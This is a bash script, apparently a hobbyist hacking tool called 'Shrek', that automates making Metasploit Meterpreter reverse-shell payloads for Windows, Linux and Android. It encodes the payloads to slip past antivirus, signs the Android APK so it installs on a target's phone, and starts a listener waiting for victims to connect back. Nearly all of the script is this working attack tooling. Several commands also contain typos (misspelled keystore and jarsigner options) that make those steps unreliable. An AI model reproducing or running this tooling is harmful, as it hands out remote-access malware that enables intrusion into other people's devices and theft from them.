#!/bin/bash

#defining colors, that will be used in the script
red='\e[1;31m'
cyan='\e[0;36m'
yellow='\e[0;33m'
orange='\e[38;5;166m'
green='\033[0;32m'
purple='\033[0;35m'
blue='\033[0;34m'
lightgreen='\e[1;32m'
RESET="\033[00m"


#function to check if user is root or not
function isroot_(){
	if [ $EUID -ne 0 ]; then
		echo -e $red
		echo "[!] Run Shrek as Root User."
		exit 1
	else
		clear 
	fi
}


#fucntion to display banner of script
function banner_(){
	sleep 3
	clear
	echo """
		⢀⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
		⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
		⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀ 
		⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆⠀⠀⠀⠀⠀⠀⠀ 
		⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆ 
		⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠁⠸⣼⡿ 
		⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉⠀⠀⠀⠀⠀ 
		⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀ 
		⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀ 
		⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀ 
		⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀ 
		⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀ 
		⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀ 
		⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠛⠉
				   
				   Shrek:   Payload and Reverse Shell Generation Automation Script
				   Author:  naqviO7
			           Version: 1.0  	 """  | lolcat -a -d 5
	
}

#function to display main menu of script
function main_menu(){
	echo -e "\n"
	echo """
		 --------------------------------------
		|   S H R E K - M A I N   M E N U      |
		 --------------------------------------
		| 1. Windows Reverse Shell             |
		| 2. Linux Reverse Shell	       |
		| 3. Android Reverse Shell             |
		| 0. Exit                              |
		 --------------------------------------  """ | lolcat -a -d 2
	echo -e "\n"
}


#function to generate windows reverse shells 
function windows_reverse_shell(){
	echo -e "\n ---------- Windows Reverse Shell ---------- " | lolcat -a -d 1
	
	#taking ip and port input from user
	echo -e $green
	read -p "Enter Attacker/Listener Ip: " lhost 
	
	#generating payload
	echo "[!] Generating Payload." | lolcat -a -d 1
	msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe -i 15 -o $HOME/Revshell.exe 
	echo "[!] Revshell.exe is stored in $HOME directory." | lolcat -a -d 1
	
	#starting metasploit listener
	echo "[!] Starting Listener." | lolcat -a -d 1
	msfconsole -q -x "use multi/handler; 
	set PAYLOAD windows/meterpreter/reverse_tcp; 
	set LHOST $lhost; 
	set LPORT 4444; 
	run;" 
	echo "[!] Exploitation completed." | lolcat -a -d 1
	read
}


#function to generate linux reverse shells
function linux_reverse_shell(){
	echo -e "\n ---------- Linux Reverse Shell ---------- " | lolcat -a -d 1
	#taking ip and port input from user
	echo -e $blue
	read -p "Enter Attacker/Listener Ip: " lhost 
	
	#generating payload
	echo "[!] Generating Payload." | lolcat -a -d 1
	msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe -i 15 -o $HOME/Revshell.exe
	echo "[!] Revshell.exe is stored in $HOME directory." | lolcat -a -d 1
	
	#starting metasploit listener
	echo "[!] Starting Listener." | lolcat -a -d 1
	msfconsole -q -x "use multi/handler; 
	set PAYLOAD linux/x86/meterpreter/reverse_tcp;
	set LHOST $lhost;
	set LPORT 4444;
	run;"
	echo "[!] Exploitation completed." | lolcat -a -d 1
	read
}


#function to generate android reverse shells
function android_reverse_shell(){
	echo -e "\n ---------- Android Reverse Shell ---------- " | lolcat -a -d 1
	echo -e $purple
	read -p "Enter Attacker/Listener Ip: " lhost 
	
	#generating payload
	echo "[!] Generating Payload." | lolcat -a -d 1
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 R> Revshell.apk
	
	#assigning different certificates to apk file 
	#without these certififcate it wont be alloed to get installed in target device
	echo "[!] Applying certificates to apk file." | lolcat -a -d 1
	keytool -genkey -v -keystroke key.keystroke -alias hacked -keyalg RSA -keysize 2048 -validity 10000
	jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.kerystore Revshell.apk hacked
	jarsigner -verfiy -verbose -certs Revshell.apk
	sleep 1
	echo "[!] Certificates are applied to apk file." | lolcat -a -d 1
	echo "[!] Revshell.apk is stored in $HOME directory." | lolcat -a -d 1
	
	#starting metasploit listener
	echo "[!] Starting Listener." | lolcat -a -d 1
	msfconsole -q -x "use multi/handler; 
	set PAYLOAD android/meterpreter/reverse_tcp;
	set LHOST $lhost;
	set LPORT 4444;
	run;"
	echo "[!] Exploitation completed." | lolcat -a -d 1
	read
} 


#main function 
function __main__(){	
	#checking if user is root
	isroot_
	sleep 3
	
	#loop to run tool continuously
	while [ 1 ]
	do 
		banner_
		main_menu
		echo -e $orange
		read -p "[!] Enter Number to perform Operation: " CHOICE
		case $CHOICE in
			1) windows_reverse_shell;;
			2) linux_reverse_shell;;
			3) android_reverse_shell;;
			0) exit;;
			*) echo "[!] Invalid choise.";
		esac
		
	done
}
#calling main function
__main__
